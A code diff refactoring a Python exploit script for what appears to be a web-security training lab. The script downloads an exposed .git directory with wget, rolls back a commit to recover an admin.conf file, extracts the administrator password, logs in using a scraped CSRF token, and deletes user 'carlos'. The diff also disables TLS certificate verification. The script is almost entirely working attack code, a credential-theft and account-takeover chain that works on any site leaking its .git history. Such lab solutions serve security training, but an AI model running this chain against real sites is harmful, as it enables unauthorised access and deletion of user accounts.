@@ -31,62 +31,53 @@ def main():
 			"http": args.proxy,
 			"https": args.proxy
 		}
+	session.verify = False
 
-	print("⦗1⦘ Fetching .git directory (wait a minute).. ")
-	
-    #Linux
-	os.system(f"wget -r https://{lab_domain}/.git")
-    # Windows
-	# os.system(f"C:\\wget\\wget.exe -r https://{lab_domain}/.git")
+	print(f"{Fore.YELLOW}⦗1⦘ Fetching .git directory (wait a minute).. {Fore.RESET}")
+	os.system(f"C:\\wget\\wget.exe -r https://{lab_domain}/.git")
 
-	print(Fore.WHITE + "⦗2⦘ Changing current working directory.. ", end="", flush=True)
+	print(f"{Fore.WHITE}⦗2⦘ Changing current working directory.. {Fore.RESET}", end="", flush=True)
 	os.chdir(lab_domain)
-	print(Fore.GREEN + "OK")
+	print(f"{Fore.GREEN}OK{Fore.RESET}")
 
 	os.system("git reset --hard HEAD~1")
-	print(Fore.WHITE + "⦗3⦘ Resetting to the previous commit.. " + Fore.GREEN + "OK" )
+	print(f"{Fore.WHITE}⦗3⦘ Resetting to the previous commit.. {Fore.GREEN}OK{Fore.RESET}")
 
-	print(Fore.WHITE + "⦗4⦘ Reading admin.conf file.. ", end="", flush=True)
+	print(f"{Fore.WHITE}⦗4⦘ Reading admin.conf file.. {Fore.RESET}", end="", flush=True)
 	admin_conf = open("admin.conf").readline()
-	print(Fore.GREEN + "OK")
+	print(f"{Fore.GREEN}OK{Fore.RESET}")
 
-	print(Fore.WHITE + "⦗5⦘ Extracting the administrator password.. ", end="", flush=True)
+	print(f"{Fore.WHITE}⦗5⦘ Extracting the administrator password.. {Fore.RESET}", end="", flush=True)
 	first_line = admin_conf.splitlines()[0]
 	admin_pass = first_line.split("=")[1]
-	print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)
+	print(f"{Fore.GREEN}OK{Fore.WHITE} => {Fore.YELLOW}{admin_pass}")
 
-	print(Fore.WHITE + "⦗6⦘ Fetching the login page to get a valid session and csrf token.. ", end="", flush=True)
+	print(f"{Fore.WHITE}⦗6⦘ Logging in as administrator.. ", end="", flush=True)
+	session = login(session, lab_domain, admin_pass)
+	print(f"{Fore.GREEN}OK{Fore.RESET}")
+
+	print(f"{Fore.WHITE}⦗7⦘ Deleting carlos.. ", end="", flush=True)
+	delete_user(session, lab_domain, "carlos")
+	print(f"{Fore.GREEN}🗹 The Lab was solved!{Fore.RESET}")
+
+def fetch(path, lab_domain, session, **kwargs):
+	try:
+		return session.get(f"https://{lab_domain}{path}", **kwargs)
+	except Exception as e:
+		print(Fore.RED + f"⦗!⦘ Failed to fetch {path}: {e}")
+		exit(1)
+
+def login(session, lab_domain, admin_pass):
 	login_page = fetch("/login", lab_domain, session)
-	session_cookie = login_page.cookies.get("session")
 	csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
-	print(Fore.GREEN + "OK")
-
-	print(Fore.WHITE + "⦗7⦘ Logging in as administrator.. ", end="", flush=True)
 	data = { "username": "administrator", "password": admin_pass, "csrf": csrf }
-	cookies = { "session": session_cookie }
-	login_resp = post_data("/login", lab_domain, data, cookies, session)
-	print(Fore.GREEN + "OK")
+	resp = session.post(f"https://{lab_domain}/login", data=data, allow_redirects=False)
+	if "session" in resp.cookies:
+		session.cookies.set("session", resp.cookies.get("session"))
+	return session
 
-	print(Fore.WHITE + "⦗8⦘ Deleting carlos.. ", end="", flush=True)
-	new_session = login_resp.cookies.get("session")
-	cookies = { "session": new_session }
-	fetch("/admin/delete?username=carlos", lab_domain, session, cookies=cookies)
-	print(Fore.GREEN + "OK")
-	print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
-
-def fetch(path, lab_domain, session, cookies=None):
-	try:
-		return session.get(f"https://{lab_domain}{path}", cookies=cookies)
-	except:
-		print(Fore.RED + f"⦗!⦘ Failed to fetch {path} through exception")
-		exit(1)
-
-def post_data(path, lab_domain, data, cookies, session):
-	try:
-		return session.post(f"https://{lab_domain}{path}", data, cookies=cookies, allow_redirects=False)
-	except:
-		print(Fore.RED + f"⦗!⦘ Failed to post data to {path} through exception")
-		exit(1)
+def delete_user(session, lab_domain, username):
+	fetch(f"/admin/delete?username={username}", lab_domain, session)
 
 if __name__ == "__main__":
 	main()
